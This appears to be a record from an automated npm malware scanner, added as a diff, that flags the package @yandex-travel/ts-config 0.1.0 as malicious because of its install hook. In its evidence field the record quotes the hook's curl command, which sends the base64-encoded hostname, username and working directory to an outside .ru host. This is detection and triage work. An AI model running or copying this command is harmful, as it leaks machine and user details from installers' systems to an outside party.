@@ -1,0 +1,33 @@
+{
+  "package_name": "@yandex-travel/ts-config",
+  "version": "0.1.0",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "install_hook",
+      "summary": "The package contains an install hook that executes at install time with commands listed in the package metadata.",
+      "details": "The install hook is present and executes at install time with commands listed in the package metadata. The commands are curl commands that seem to be used for sending HTTP requests. The commands include base64 encoded hostname, username, and working directory, and a payload 'meow!securitytest'. This could potentially be used for malicious purposes such as command and control, credential theft, or network exfiltration.",
+      "confidence": 0.92,
+      "evidence_commands": [
+        "curl -H \"Package:@yandex-travel/ts-config\" -H \"Version:0.1.0\" -H \"Hostname:$(hostname|base64)\" -H \"Whoami:$(whoami|base64)\" -H \"Pwd:$(pwd|base64)\" -d \"meow!securitytest\" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+      ],
+      "evidence_files": [],
+      "evidence_apis": [],
+      "evidence_domains": [],
+      "evidence_env_vars": []
+    }
+  ],
+  "risk_vector": [
+    "install_hook"
+  ],
+  "analyst_note": "This JSON object represents the analysis of the package @yandex-travel/ts-config with version 0.1.0. The behavior category is \"install_hook\", which indicates that the package contains an install hook that executes at install time with commands listed in the package metadata. The details of the behavior indicate that the install hook is used for sending HTTP requests with base64 encoded hostname, username, and working directory, and a payload 'meow!securitytest'. The confidence score is 0.92, indicating a high level of confidence in the detection of this behavior. The risk vector includes the \"install_hook\" category.",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T21:57:30.155809"
+}
